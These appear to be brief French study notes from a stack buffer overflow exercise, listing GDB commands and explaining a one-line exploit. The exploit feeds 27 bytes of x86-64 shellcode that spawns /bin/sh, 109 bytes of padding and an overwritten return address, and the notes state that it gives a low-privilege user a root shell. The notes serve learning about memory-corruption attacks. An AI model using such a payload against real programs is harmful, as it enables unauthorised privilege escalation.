layout prev : accès à un mode de vue de stack
 nexti : passer des instructions

ctrl + x + a : quitté le menu layout

run $(python2 -c 'print "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" + "a" * 109 + "\x70\xdd\xff\xff\xff\x7f"')

la commande ci-dessus, on commence en mettant du code exécutable permettant de lancé /bin/sh, il fait 27 bytes
ensuite on effectué du padding, dans notre cas, on place 109 "a"
enfin, on place notre addresse de retour trouvé grâce au premier padding, il fait 8 bytes.

la grande particularité c'est qu'un utilisateur n'ayant que quelque droit root, peut ouvrir un sheel ayant les droit root.
